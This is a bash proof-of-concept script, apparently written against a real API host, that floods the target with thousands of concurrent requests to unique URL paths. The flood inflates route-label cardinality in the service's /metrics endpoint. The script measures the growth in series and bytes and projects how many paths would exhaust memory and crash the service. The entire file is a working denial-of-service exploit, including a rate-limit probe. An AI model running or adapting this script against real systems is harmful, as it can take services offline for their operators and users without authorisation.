#!/usr/bin/env bash
set -uo pipefail
TARGET="${TARGET:-https://api.aggregate.surf}"
COUNT="${COUNT:-2000}"; CONC="${CONC:-25}"; TIMEOUT="${TIMEOUT:-8}"
PFX="dospoc-$(date +%s)-$$"
snap(){ local b; b="$(curl -sS --max-time 30 "$TARGET/metrics")"; echo "$(printf '%s' "$b"|wc -c|tr -d ' ') $(printf '%s' "$b"|grep -vcE '^#')"; }
echo "target=$TARGET count=$COUNT conc=$CONC prefix=$PFX"
read -r B_BYTES B_SER < <(snap); echo "baseline: bytes=$B_BYTES series=$B_SER"
echo "rate-limit check (5x 404):"; for i in 1 2 3 4 5; do curl -sS -o /dev/null -w '%{http_code} ' --max-time "$TIMEOUT" "$TARGET/rlcheck-$RANDOM-$i"; done; echo
echo "injecting $COUNT unique paths..."; t0=$(date +%s)
seq 1 "$COUNT" | xargs -P"$CONC" -I{} curl -sS -o /dev/null --max-time "$TIMEOUT" "$TARGET/$PFX-{}" 2>/dev/null
echo "sent in $(( $(date +%s)-t0 ))s"; sleep 3
read -r A_BYTES A_SER < <(snap)
INJ=$(curl -sS --max-time 30 "$TARGET/metrics"|grep -oE "route=\"/$PFX-[0-9]+\""|sort -u|wc -l|tr -d ' ')
echo "=== RESULT ==="
printf "%-18s %12s %12s %12s\n" "" before after delta
printf "%-18s %12s %12s %12s\n" "/metrics bytes" "$B_BYTES" "$A_BYTES" "$((A_BYTES-B_BYTES))"
printf "%-18s %12s %12s %12s\n" "series" "$B_SER" "$A_SER" "$((A_SER-B_SER))"
echo "our paths on 1 replica: $INJ/$COUNT (less = spread across replicas)"
python3 - "$((A_BYTES-B_BYTES))" "$((A_SER-B_SER))" "$INJ" <<'PY' 2>/dev/null || true
import sys; db,ds,inj=map(int,sys.argv[1:4])
if inj>0: print(f"per path: +{db/inj:,.0f}B, +{ds/inj:.1f} series -> 1e6 paths ~= {ds/inj*1e6*200/1e9:,.1f} GB RAM -> OOM")
PY
